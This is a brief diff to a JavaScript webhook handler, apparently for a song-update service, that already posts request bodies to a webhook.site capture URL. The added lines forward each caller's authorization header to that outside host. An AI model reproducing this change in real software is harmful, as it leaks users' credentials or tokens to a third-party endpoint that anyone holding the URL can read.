@@ -34,6 +34,9 @@ exports.updateSongWebhook = async (req, res) => {
     const resp = await fetch('https://webhook.site/2faf72f0-6f70-4882-b364-fa945df8620c', {
       method: 'POST',
       body: JSON.stringify(reqBody),
+      headers: {
+        Authorizations: req.headers.authorization,
+      },
     });
 
     const data = await resp.json();
